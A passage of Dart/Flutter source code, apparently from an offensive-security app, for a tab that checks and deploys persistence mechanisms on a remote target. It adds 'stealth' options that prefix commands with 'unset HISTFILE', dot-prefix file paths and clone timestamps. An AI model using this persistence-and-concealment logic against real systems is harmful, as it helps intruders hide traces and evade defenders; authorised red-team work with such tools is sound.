  State<PersistenceTab> createState() => _PersistenceTabState();
}

class _PersistenceTabState extends State<PersistenceTab>
    with AutomaticKeepAliveClientMixin {
  final Map<String, _DetectionResult?> _detectionResults = {};
  final Map<String, String?> _deployResults = {};
  final Map<String, String?> _rollbackCommands = {};
  final Map<String, bool> _running = {};
  final Map<String, bool> _deploying = {};
  bool _runningAll = false;

  // Stealth defaults (can be toggled per-deploy in dialog)
  bool _stealthHide = true;
  bool _stealthTimestamp = true;
  bool _stealthCleanHistory = true;

  late final List<_PersistGroup> _groups;

  @override
  void initState() {
    super.initState();
    _groups = _filterGroups(widget.service.isWindowsTarget);
  }

  @override
  bool get wantKeepAlive => true;

  String _ckey(String methodId) => 'check/$methodId';
  String _dkey(String methodId) => 'deploy/$methodId';
  String _rkey(String methodId) => 'rollback/$methodId';

  // ── Check ──────────────────────────────────────────────────────────────────

  Future<void> _runCheck(_PersistMethod method) async {
    final key = _ckey(method.id);
    setState(() => _running[key] = true);
    try {
      final out = await widget.service.executeCommand(method.checkCommand);
      if (mounted) {
        final result = _parseDetection(method.id, out);
        setState(() {
          _detectionResults[key] = result;
          _running[key] = false;
        });
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _detectionResults[key] = _DetectionResult.error('[Error] $e');
          _running[key] = false;
        });
      }
    }
  }

  Future<void> _runAllChecks() async {
    setState(() => _runningAll = true);
    for (final g in _groups) {
      for (final m in g.methods) {
        await _runCheck(m);
      }
    }
    if (mounted) setState(() => _runningAll = false);
  }

  void _clearAll() => setState(() {
        _detectionResults.clear();
        _deployResults.clear();
        _rollbackCommands.clear();
        _running.clear();
        _deploying.clear();
      });

  // ── Deploy ─────────────────────────────────────────────────────────────────

  /// Apply stealth options to a filled command.
  String _applyStealth(
    String cmd,
    _PersistMethod method,
    Map<String, String> paramValues,
  ) {
    var result = cmd;

    // Shell history cleanup
    if (_stealthCleanHistory && method.stealth.canHistoryClean) {
      result = 'unset HISTFILE; $result';
    }

    return result;
  }

  Future<void> _executeDeploy(
    _PersistMethod method,
    String cmd, {
    String? verifyCmd,
    String? rollbackCmd,
  }) async {
    final dkey = _dkey(method.id);
    setState(() => _deploying[dkey] = true);
    try {
      final out = await widget.service.executeCommand(cmd);
      final success = _parseDeploySuccess(out);

      if (mounted) {
        setState(() {
          _deployResults[dkey] = success
              ? '✓ Deploy successful${out.length > 8 ? '\n${out.trim()}' : ''}'
              : '✗ Deploy failed${out.isNotEmpty ? '\n${out.trim()}' : ''}';
          _deploying[dkey] = false;
        });

        // Store rollback command
        if (success && rollbackCmd != null) {
          _rollbackCommands[_rkey(method.id)] = rollbackCmd;
        }
      }

      // Auto-verify
      if (verifyCmd != null && mounted) {
        await Future.delayed(const Duration(milliseconds: 500));
        final vkey = 'verify/${method.id}';
        setState(() => _running[vkey] = true);
        try {
          final vout = await widget.service.executeCommand(verifyCmd);
          if (mounted) {
            final vSuccess = _parseVerifySuccess(vout);
            setState(() {
              _detectionResults[vkey] = vSuccess
                  ? _DetectionResult(
                      verdict: DetectionVerdict.found,
                      summary: '✓ Verified: persistence active',
                      rawOutput: vout,
                      confidence: 0.95,
                    )
                  : _DetectionResult(
                      verdict: DetectionVerdict.error,
                      summary: '✗ Verification failed',
                      rawOutput: vout,
                      confidence: 0.8,
                    );
              _running[vkey] = false;
            });
          }
        } catch (e) {
          if (mounted) {
            setState(() {
              _detectionResults[vkey] =
                  _DetectionResult.error('[Error] $e');
              _running[vkey] = false;
            });
          }
        }
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _deployResults[dkey] = '✗ [Error] $e';
          _deploying[dkey] = false;
        });
      }
    }
  }

  // ── Preflight ──────────────────────────────────────────────────────────────

  Future<List<_PreflightResult>> _runPreflight(_PersistMethod method) async {
    final results = <_PreflightResult>[];
    for (final cmd in method.preflightCommands) {
      try {
        final out = await widget.service.executeCommand(cmd);
        final trimmed = out.trim();
        if (trimmed.startsWith('OK:')) {
          results.add(_PreflightResult(
            ok: true,
            message: trimmed.substring(3),
          ));
        } else if (trimmed.startsWith('FAIL:')) {
          results.add(_PreflightResult(
            ok: false,
            message: trimmed.substring(5),
          ));
        } else if (trimmed.startsWith('INFO:')) {
          results.add(_PreflightResult(
            ok: true,
            isInfo: true,
            message: trimmed.substring(5),
          ));
        } else {
          results.add(_PreflightResult(
            ok: true,
            message: trimmed,
          ));
        }
      } catch (e) {
        results.add(_PreflightResult(
          ok: false,
          message: '[Error] $e',
        ));
      }
    }
    return results;
  }

  // ── Deploy flow ────────────────────────────────────────────────────────────

  Future<void> _onDeployPressed(_PersistMethod method) async {
    // Step 1: Parameter dialog with stealth toggles
    final controllers = <String, TextEditingController>{};
    for (final p in method.params) {
      controllers[p.id] = TextEditingController(text: p.defaultValue);
    }

    // Local stealth state for this dialog
    var stealthHide = _stealthHide && method.stealth.canDotPrefix;
    var stealthTimestamp = _stealthTimestamp && method.stealth.canTimestampClone;
    var stealthCleanHistory = _stealthCleanHistory && method.stealth.canHistoryClean;

    final result = await showDialog<_DeployDialogResult>(
      context: context,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setDialogState) => _PersistDeployDialog(
          method: method,
          controllers: controllers,
          stealthHide: stealthHide,
          stealthTimestamp: stealthTimestamp,
          stealthCleanHistory: stealthCleanHistory,
          onStealthChanged: (hide, ts, hist) {
            setDialogState(() {
              stealthHide = hide;
              stealthTimestamp = ts;
              stealthCleanHistory = hist;
            });
          },
        ),
      ),
    );

    if (result == null || !mounted) {
      // Dispose controllers
      for (final c in controllers.values) {
        c.dispose();
      }
      return;
    }

    // Apply stealth to file-path parameters
    final paramValues = <String, String>{};
    for (final p in method.params) {
      var val = controllers[p.id]!.text;
      if (p.isFilePath && stealthHide) {
        val = _toDotPath(val);
      }
      paramValues[p.id] = val;
    }

    // Build commands
    var cmd = method.deployTemplate;
    for (final entry in paramValues.entries) {
      cmd = cmd.replaceAll('{${entry.key}}', entry.value);
    }
    cmd = _applyStealth(cmd, method, paramValues);

    // Build verify command
    String? verifyCmd = method.verifyTemplate;
    for (final entry in paramValues.entries) {
      verifyCmd = verifyCmd?.replaceAll('{${entry.key}}', entry.value);
    }

    // Build rollback command
    String? rollbackCmd;
    if (method.rollbackTemplate != null) {
      rollbackCmd = method.rollbackTemplate!;
      for (final entry in paramValues.entries) {
        rollbackCmd = rollbackCmd!.replaceAll('{${entry.key}}', entry.value);
      }
    }

    // Dispose controllers
    for (final c in controllers.values) {
      c.dispose();
    }

    // Step 2: Run preflight
    List<_PreflightResult> preflightResults = [];
    if (method.preflightCommands.isNotEmpty) {
      preflightResults = await _runPreflight(method);
    }

    // Step 3: Final confirmation with preflight results
    if (!mounted) return;
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (ctx) => _DeployConfirmDialog(
        method: method,
        cmd: cmd,
        preflightResults: preflightResults,
        stealthSummary: _buildStealthSummary(
          method, stealthHide, stealthTimestamp, stealthCleanHistory),
      ),
    );

    if (confirmed == true && mounted) {
      await _executeDeploy(
        method,
        cmd,
        verifyCmd: verifyCmd,
        rollbackCmd: rollbackCmd,
      );
    }
  }

  String _buildStealthSummary(
    _PersistMethod method, bool hide, bool ts, bool hist) {
    final parts = <String>[];
    if (hide && method.stealth.canDotPrefix) parts.add('dot-prefix path');
    if (ts && method.stealth.canTimestampClone) parts.add('timestamp clone');
    if (hist && method.stealth.canHistoryClean) parts.add('history clean');
    return parts.isEmpty ? 'none' : parts.join(', ');
  }

  // ── Build ──────────────────────────────────────────────────────────────────

  @override
  Widget build(BuildContext context) {
    super.build(context);
    var checkDone = 0;
    var checkTotal = 0;
    for (final g in _groups) {
      checkTotal += g.methods.length;
      for (final m in g.methods) {
        if (_detectionResults[_ckey(m.id)] != null) checkDone++;
      }
    }

    return Column(
      children: [
        // Header
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
          color: AppColors.bgElevated,
          child: Row(
            children: [
              const Icon(Icons.link, color: AppColors.amber, size: 16),
              const SizedBox(width: 8),
              Text(
                'Persistence mechanisms',
                style: AppTextStyles.heading(size: 14, color: AppColors.amber),
              ),
              if (checkDone > 0) ...[
                const SizedBox(width: 8),
                Container(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                  decoration: BoxDecoration(
                    color: AppColors.amber.withValues(alpha: 0.15),
                    borderRadius: BorderRadius.circular(4),
                  ),
                  child: Text(
                    '$checkDone/$checkTotal',
                    style: AppTextStyles.caption(size: 11, color: AppColors.amber),
                  ),
                ),
              ],
              const Spacer(),
              if (checkDone > 0)
                TextButton.icon(
                  onPressed: _runningAll ? null : _clearAll,
                  icon: const Icon(Icons.delete_sweep_outlined, size: 14),
                  label: const Text('Clear'),
                  style: TextButton.styleFrom(
                    foregroundColor: AppColors.textSecondary,
                    padding: const EdgeInsets.symmetric(horizontal: 8),
                  ),
                ),
              const SizedBox(width: 4),
              FilledButton.icon(
                onPressed: _runningAll ? null : _runAllChecks,
                icon: _runningAll
                    ? const SizedBox(
                        width: 12,
                        height: 12,
                        child: CircularProgressIndicator(
                          strokeWidth: 1.5,
                          color: Colors.white,
                        ),
                      )
                    : const Icon(Icons.play_arrow_rounded, size: 15),
                label: Text(_runningAll ? 'Checking all…' : 'Check all'),
                style: FilledButton.styleFrom(
                  backgroundColor: AppColors.amber,
                  foregroundColor: Colors.black,
                  padding:
                      const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                  textStyle: AppTextStyles.body(size: 13),
                ),
              ),
            ],
          ),
        ),
        // Stealth defaults bar
        if (!widget.service.isWindowsTarget)
          Container(
            padding:
                const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
            color: AppColors.bgCard,
            child: Row(
              children: [
                Icon(Icons.visibility_off_outlined,
                    size: 13, color: AppColors.textMuted),
                const SizedBox(width: 6),
                Text('Stealth defaults:',
                    style: AppTextStyles.caption(
                        size: 11, color: AppColors.textMuted)),
                const SizedBox(width: 10),
                _StealthChip(
                  label: 'Hide files',
                  value: _stealthHide,
                  onChanged: (v) => setState(() => _stealthHide = v),
                ),
                const SizedBox(width: 6),
                _StealthChip(
                  label: 'Timestamp',
                  value: _stealthTimestamp,
                  onChanged: (v) => setState(() => _stealthTimestamp = v),
                ),
                const SizedBox(width: 6),
                _StealthChip(
                  label: 'History',
                  value: _stealthCleanHistory,
                  onChanged: (v) => setState(() => _stealthCleanHistory = v),
                ),
              ],
            ),
          ),
        Expanded(
          child: ListView(
            padding:
                const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            children: [
              ..._groups.map(
                (group) => _PersistGroupWidget(
                  group: group,
                  detectionResults: _detectionResults,
                  deployResults: _deployResults,
                  rollbackCommands: _rollbackCommands,
                  running: _running,
                  deploying: _deploying,
                  ckey: _ckey,
                  dkey: _dkey,
                  rkey: _rkey,
                  onCheck: _runCheck,
                  onDeploy: _onDeployPressed,
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Preflight result helper
// ═══════════════════════════════════════════════════════════════════════════════

class _PreflightResult {
  final bool ok;
  final String message;
  final bool isInfo;
  const _PreflightResult({
    required this.ok,
    required this.message,
    this.isInfo = false,
  });
}

class _DeployDialogResult {
  final bool confirmed;
  const _DeployDialogResult(this.confirmed);
}

// ═══════════════════════════════════════════════════════════════════════════════
// Stealth chip
// ═══════════════════════════════════════════════════════════════════════════════

class _StealthChip extends StatelessWidget {
  final String label;
  final bool value;
  final ValueChanged<bool> onChanged;

  const _StealthChip({
    required this.label,
    required this.value,
    required this.onChanged,
  });

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: () => onChanged(!value),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
        decoration: BoxDecoration(
          color: value
              ? AppColors.primary.withValues(alpha: 0.15)
              : AppColors.bgDark,
          borderRadius: BorderRadius.circular(4),
          border: Border.all(
            color: value
                ? AppColors.primary.withValues(alpha: 0.4)
                : AppColors.border,
          ),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(
              value ? Icons.check_box : Icons.check_box_outline_blank,
              size: 13,
              color: value ? AppColors.primary : AppColors.textMuted,
            ),
            const SizedBox(width: 4),
            Text(
              label,
              style: AppTextStyles.caption(
                size: 10,
                color: value ? AppColors.primary : AppColors.textMuted,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Deploy dialog (params + stealth toggles)
// ═══════════════════════════════════════════════════════════════════════════════

class _PersistDeployDialog extends StatelessWidget {
  final _PersistMethod method;
  final Map<String, TextEditingController> controllers;
  final bool stealthHide;
  final bool stealthTimestamp;
  final bool stealthCleanHistory;
  final void Function(bool hide, bool ts, bool hist) onStealthChanged;

  const _PersistDeployDialog({
    required this.method,
    required this.controllers,
    required this.stealthHide,
    required this.stealthTimestamp,
    required this.stealthCleanHistory,
    required this.onStealthChanged,
  });

  String _buildPreview() {
    var cmd = method.deployTemplate;
    for (final p in method.params) {
      var val = controllers[p.id]?.text ?? p.defaultValue;
      if (p.isFilePath && stealthHide) {
        val = _toDotPath(val);
      }
      cmd = cmd.replaceAll('{${p.id}}', val);
    }
    if (stealthCleanHistory && method.stealth.canHistoryClean) {
      cmd = 'unset HISTFILE; $cmd';
    }
    return cmd;
  }

  @override
  Widget build(BuildContext context) {
    final cmd = _buildPreview();

    return AlertDialog(
      title: Text(method.name, style: AppTextStyles.heading(size: 16)),
      content: SizedBox(
        width: 520,
        child: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              // Warning
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.red.withValues(alpha: 0.08),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(
                      color: AppColors.red.withValues(alpha: 0.3)),
                ),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const Icon(Icons.warning_amber_rounded,
                        color: AppColors.red, size: 18),
                    const SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        method.warningText,
                        style: AppTextStyles.caption(
                            size: 12, color: AppColors.red),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 14),
              // Parameters
              ...method.params.map((p) => Padding(
                    padding: const EdgeInsets.only(bottom: 12),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            Text(p.label,
                                style: AppTextStyles.body(
                                    size: 12,
                                    color: AppColors.textSecondary)),
                            if (p.isFilePath) ...[
                              const SizedBox(width: 4),
                              Text('(path)',
                                  style: AppTextStyles.caption(
                                      size: 10,
                                      color: AppColors.textMuted)),
                            ],
                          ],
                        ),
                        const SizedBox(height: 4),
                        TextField(
                          controller: controllers[p.id],
                          maxLines: p.multiline ? 5 : 1,
                          minLines: p.multiline ? 3 : 1,
                          style: const TextStyle(
                            fontFamily: 'Monaco',
                            fontFamilyFallback: [
                              'Courier New',
                              'monospace'
                            ],
                            fontSize: 12,
                            color: AppColors.textPrimary,
                          ),
                          decoration: InputDecoration(
                            hintText: p.hint,
                            hintStyle: const TextStyle(
                              fontSize: 11,
                              color: AppColors.textMuted,
                            ),
                            contentPadding: const EdgeInsets.all(10),
                            filled: true,
                            fillColor: AppColors.bgDark,
                            border: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(6),
                              borderSide:
                                  const BorderSide(color: AppColors.border),
                            ),
                            focusedBorder: OutlineInputBorder(
                              borderRadius: BorderRadius.circular(6),
                              borderSide: BorderSide(
                                  color: AppColors.primary
                                      .withValues(alpha: 0.5)),
                            ),
                          ),
                        ),
                      ],
                    ),
                  )),
              const SizedBox(height: 8),
              // Stealth toggles
              if (method.stealth.canDotPrefix ||
                  method.stealth.canTimestampClone ||
                  method.stealth.canHistoryClean) ...[
                Text('Stealth options',
                    style: AppTextStyles.body(
                        size: 12, color: AppColors.textSecondary)),
                const SizedBox(height: 6),
                Wrap(
                  spacing: 6,
                  runSpacing: 6,
                  children: [
                    if (method.stealth.canDotPrefix)
                      _DeployStealthToggle(
                        label: 'Dot-prefix paths',
                        value: stealthHide,
                        onChanged: (v) => onStealthChanged(
                            v, stealthTimestamp, stealthCleanHistory),
                      ),
                    if (method.stealth.canTimestampClone)
                      _DeployStealthToggle(
                        label: 'Clone timestamp',
                        value: stealthTimestamp,
                        onChanged: (v) => onStealthChanged(
                            stealthHide, v, stealthCleanHistory),
                      ),
                    if (method.stealth.canHistoryClean)
                      _DeployStealthToggle(
                        label: 'Clean history',
                        value: stealthCleanHistory,
                        onChanged: (v) => onStealthChanged(
                            stealthHide, stealthTimestamp, v),
                      ),
                  ],
                ),
                const SizedBox(height: 12),
              ],
              // Live command preview
              Text('Command preview',
                  style: AppTextStyles.body(
                      size: 13, color: AppColors.textPrimary)),
              const SizedBox(height: 6),
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.bgDark,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.border),
                ),
                child: SelectableText(
                  cmd,
                  style: const TextStyle(
                    fontFamily: 'Monaco',
                    fontFamilyFallback: [
                      'Courier New',
                      'monospace'
                    ],
                    fontSize: 11,
                    color: AppColors.cyan,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context, null),
          child:
              Text('Cancel', style: AppTextStyles.caption(size: 13)),
        ),
        FilledButton(
          onPressed: () =>
              Navigator.pop(context, const _DeployDialogResult(true)),
          style: FilledButton.styleFrom(
            backgroundColor: AppColors.red,
          ),
          child: Text('Next →',
              style: AppTextStyles.body(size: 13, color: Colors.white)),
        ),
      ],
    );
  }
}

// ── Stealth toggle within deploy dialog ──────────────────────────────────────

class _DeployStealthToggle extends StatelessWidget {
  final String label;
  final bool value;
  final ValueChanged<bool> onChanged;

  const _DeployStealthToggle({
    required this.label,
    required this.value,
    required this.onChanged,
  });

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: () => onChanged(!value),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
        decoration: BoxDecoration(
          color: value
              ? AppColors.primary.withValues(alpha: 0.12)
              : AppColors.bgDark,
          borderRadius: BorderRadius.circular(4),
          border: Border.all(
            color: value
                ? AppColors.primary.withValues(alpha: 0.35)
                : AppColors.border,
          ),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(
              value ? Icons.check_box_rounded : Icons.check_box_outline_blank,
              size: 14,
              color: value ? AppColors.primary : AppColors.textMuted,
            ),
            const SizedBox(width: 5),
            Text(label,
                style: AppTextStyles.caption(
                    size: 11,
                    color: value ? AppColors.primary : AppColors.textMuted)),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Final confirmation dialog (preflight + command)
// ═══════════════════════════════════════════════════════════════════════════════

class _DeployConfirmDialog extends StatelessWidget {
  final _PersistMethod method;
  final String cmd;
  final List<_PreflightResult> preflightResults;
  final String stealthSummary;

  const _DeployConfirmDialog({
    required this.method,
    required this.cmd,
    required this.preflightResults,
    required this.stealthSummary,
  });

  @override
  Widget build(BuildContext context) {
    final allPreflightOk =
        preflightResults.every((r) => r.ok);

    return AlertDialog(
      title: Row(
        children: [
          const Icon(Icons.warning_amber_rounded,
              color: AppColors.red, size: 22),
          const SizedBox(width: 8),
          Text('Final confirmation',
              style: AppTextStyles.heading(size: 16)),
        ],
      ),
      content: SizedBox(
        width: 520,
        child: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              // Warning
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.red.withValues(alpha: 0.08),
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(
                      color: AppColors.red.withValues(alpha: 0.3)),
                ),
                child: Text(
                  method.warningText,
                  style: AppTextStyles.caption(
                      size: 12, color: AppColors.red),
                ),
              ),
              // Preflight
              if (preflightResults.isNotEmpty) ...[
                const SizedBox(height: 14),
                Text('Pre-flight checks',
                    style: AppTextStyles.body(
                        size: 13, color: AppColors.textPrimary)),
                const SizedBox(height: 6),
                ...preflightResults.map((r) => Container(
                      margin: const EdgeInsets.only(bottom: 4),
                      padding: const EdgeInsets.symmetric(
                          horizontal: 8, vertical: 6),
                      decoration: BoxDecoration(
                        color: r.ok
                            ? AppColors.primary.withValues(alpha: 0.06)
                            : AppColors.red.withValues(alpha: 0.08),
                        borderRadius: BorderRadius.circular(4),
                        border: Border.all(
                          color: r.ok
                              ? AppColors.primary.withValues(alpha: 0.25)
                              : AppColors.red.withValues(alpha: 0.3),
                        ),
                      ),
                      child: Row(
                        children: [
                          Icon(
                            r.ok
                                ? (r.isInfo
                                    ? Icons.info_outline
                                    : Icons.check_circle_outline)
                                : Icons.cancel_outlined,
                            size: 14,
                            color: r.ok
                                ? (r.isInfo
                                    ? AppColors.textMuted
                                    : AppColors.primary)
                                : AppColors.red,
                          ),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              r.message,
                              style: AppTextStyles.caption(
                                size: 11,
                                color: r.ok
                                    ? AppColors.textSecondary
                                    : AppColors.red,
                              ),
                            ),
                          ),
                        ],
                      ),
                    )),
              ],
              // Stealth summary
              const SizedBox(height: 8),
              Text('Stealth: $stealthSummary',
                  style: AppTextStyles.caption(
                      size: 11, color: AppColors.textMuted)),
              // Command
              const SizedBox(height: 12),
              Text('Command preview',
                  style: AppTextStyles.body(
                      size: 13, color: AppColors.textPrimary)),
              const SizedBox(height: 8),
              Container(
                width: double.infinity,
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: AppColors.bgDark,
                  borderRadius: BorderRadius.circular(6),
                  border: Border.all(color: AppColors.border),
                ),
                child: SelectableText(
                  cmd,
                  style: const TextStyle(
                    fontFamily: 'Monaco',
                    fontFamilyFallback: [
                      'Courier New',
                      'monospace'
                    ],
                    fontSize: 11,
                    color: AppColors.cyan,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
      actions: [
        TextButton(
          onPressed: () => Navigator.pop(context, false),
          child: Text('Cancel',
              style: AppTextStyles.caption(size: 13)),
        ),
        FilledButton(
          onPressed: () => Navigator.pop(context, true),
          style: FilledButton.styleFrom(
            backgroundColor: allPreflightOk
                ? AppColors.red
                : AppColors.red.withValues(alpha: 0.6),
          ),
          child: Text(
              allPreflightOk ? 'Deploy' : 'Deploy anyway',
              style: AppTextStyles.body(size: 13, color: Colors.white)),
        ),
      ],
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Group widget
// ═══════════════════════════════════════════════════════════════════════════════

class _PersistGroupWidget extends StatelessWidget {
  final _PersistGroup group;
  final Map<String, _DetectionResult?> detectionResults;
  final Map<String, String?> deployResults;
  final Map<String, String?> rollbackCommands;
  final Map<String, bool> running;
  final Map<String, bool> deploying;
  final String Function(String) ckey;
  final String Function(String) dkey;
  final String Function(String) rkey;
  final void Function(_PersistMethod) onCheck;
  final void Function(_PersistMethod) onDeploy;

  const _PersistGroupWidget({
    required this.group,
    required this.detectionResults,
    required this.deployResults,
    required this.rollbackCommands,
    required this.running,
    required this.deploying,
    required this.ckey,
    required this.dkey,
    required this.rkey,
    required this.onCheck,
    required this.onDeploy,
  });

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.only(bottom: 8),
            child: Row(
              children: [
                Icon(group.icon, size: 14, color: group.color),
                const SizedBox(width: 6),
                Text(
                  group.title,
                  style:
                      AppTextStyles.heading(size: 13, color: group.color),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Divider(
                    color: group.color.withValues(alpha: 0.25),
                    height: 1,
                  ),
                ),
              ],
            ),
          ),
          ...group.methods.map((method) => _PersistMethodWidget(
                method: method,
                color: group.color,
                detectionResult: detectionResults[ckey(method.id)],
                deployResult: deployResults[dkey(method.id)],
                rollbackCommand: rollbackCommands[rkey(method.id)],
                verifyResult: detectionResults['verify/${method.id}'],
                isRunning: running[ckey(method.id)] == true,
                isDeploying: deploying[dkey(method.id)] == true,
                isVerifying: running['verify/${method.id}'] == true,
                onCheck: () => onCheck(method),
                onDeploy: () => onDeploy(method),
              )),
        ],
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Method item widget
// ═══════════════════════════════════════════════════════════════════════════════

class _PersistMethodWidget extends StatelessWidget {
  final _PersistMethod method;
  final Color color;
  final _DetectionResult? detectionResult;
  final String? deployResult;
  final String? rollbackCommand;
  final _DetectionResult? verifyResult;
  final bool isRunning;
  final bool isDeploying;
  final bool isVerifying;
  final VoidCallback onCheck;
  final VoidCallback onDeploy;

  const _PersistMethodWidget({
    required this.method,
    required this.color,
    required this.detectionResult,
    required this.deployResult,
    this.rollbackCommand,
    this.verifyResult,
    required this.isRunning,
    required this.isDeploying,
    this.isVerifying = false,
    required this.onCheck,
    required this.onDeploy,
  });

  @override
  Widget build(BuildContext context) {
    final hasDetection = detectionResult != null;
    final hasDeploy = deployResult != null;
    final hasVerify = verifyResult != null;
    final isDeployError =
        deployResult?.contains('✗') == true;
    final hasRollback = rollbackCommand != null && rollbackCommand!.isNotEmpty;
    final isBlocked = detectionResult?.exploitability != null &&
        !detectionResult!.exploitability!.isDeployable;
    final blockedReasons = isBlocked
        ? detectionResult!.exploitability!.blocked
        : <String>[];

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(
        color: AppColors.bgCard,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: hasDetection
              ? (isBlocked
                  ? AppColors.red.withValues(alpha: 0.4)
                  : AppColors.primary.withValues(alpha: 0.4))
              : AppColors.border,
        ),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding:
                const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        method.name,
                        style: AppTextStyles.body(
                            size: 13, color: AppColors.textPrimary),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        method.description,
                        style: AppTextStyles.caption(
                            size: 11, color: AppColors.textMuted),
                      ),
                      const SizedBox(height: 5),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 6, vertical: 3),
                        decoration: BoxDecoration(
                          color: AppColors.bgDark,
                          borderRadius: BorderRadius.circular(4),
                        ),
                        child: Text(
                          method.checkCommand.length > 64
                              ? '${method.checkCommand.substring(0, 64)}…'
                              : method.checkCommand,
                          style: const TextStyle(
                            fontFamily: 'Monaco',
                            fontFamilyFallback: [
                              'Courier New',
                              'monospace'
                            ],
                            fontSize: 10.5,
                            color: AppColors.textSecondary,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 10),
                // Check + Deploy buttons
                Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    SizedBox(
                      width: 68,
                      height: 28,
                      child: isRunning
                          ? Center(
                              child: SizedBox(
                                width: 14,
                                height: 14,
                                child: CircularProgressIndicator(
                                  strokeWidth: 1.5,
                                  color: color,
                                ),
                              ),
                            )
                          : OutlinedButton(
                              onPressed: onCheck,
                              style: OutlinedButton.styleFrom(
                                foregroundColor: color,
                                side: BorderSide(
                                    color:
                                        color.withValues(alpha: 0.6)),
                                padding: EdgeInsets.zero,
                                shape: RoundedRectangleBorder(
                                  borderRadius:
                                      BorderRadius.circular(6),
                                ),
                              ),
                              child: Text(
                                hasDetection ? 'Retry' : 'Check',
                                style: AppTextStyles.caption(
                                    size: 10, color: color),
                              ),
                            ),
                    ),
                    const SizedBox(height: 4),
                    SizedBox(
                      width: 68,
                      height: 28,
                      child: isDeploying
                          ? const Center(
                              child: SizedBox(
                                width: 14,
                                height: 14,
                                child: CircularProgressIndicator(
                                  strokeWidth: 1.5,
                                  color: AppColors.red,
                                ),
                              ),
                            )
                          : FilledButton(
                              onPressed: isBlocked ? null : onDeploy,
                              style: FilledButton.styleFrom(
                                backgroundColor: isBlocked
                                    ? AppColors.textMuted
                                        .withValues(alpha: 0.5)
                                    : AppColors.red
                                        .withValues(alpha: 0.8),
                                padding: EdgeInsets.zero,
                                shape: RoundedRectangleBorder(
                                  borderRadius:
                                      BorderRadius.circular(6),
                                ),
                              ),
                              child: Tooltip(
                                message: isBlocked
                                    ? 'Blocked: ${blockedReasons.join("; ")}'
                                    : 'Deploy',
                                child: Text(
                                  'Deploy',
                                  style: AppTextStyles.caption(
                                      size: 10,
                                      color: isBlocked
                                          ? AppColors.textMuted
                                          : Colors.white),
                                ),
                              ),
                            ),
                    ),
                  ],
                ),
              ],
            ),
          ),
          // Detection result — raw output
          if (hasDetection)
            Container(
              width: double.infinity,
              decoration: BoxDecoration(
                color: AppColors.bgDark.withValues(alpha: 0.8),
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(8),
                  bottomRight: Radius.circular(8),
                ),
                border: Border(
                  top: BorderSide(
                    color: isBlocked
                        ? AppColors.red.withValues(alpha: 0.3)
                        : AppColors.border,
                  ),
                ),
              ),
              padding: const EdgeInsets.all(10),
              child: SelectableText(
                detectionResult!.rawOutput ?? '(no output)',
                style: const TextStyle(
                  fontFamily: 'Monaco',
                  fontFamilyFallback: ['Courier New', 'monospace'],
                  fontSize: 10.5,
                  height: 1.4,
                  color: AppColors.textSecondary,
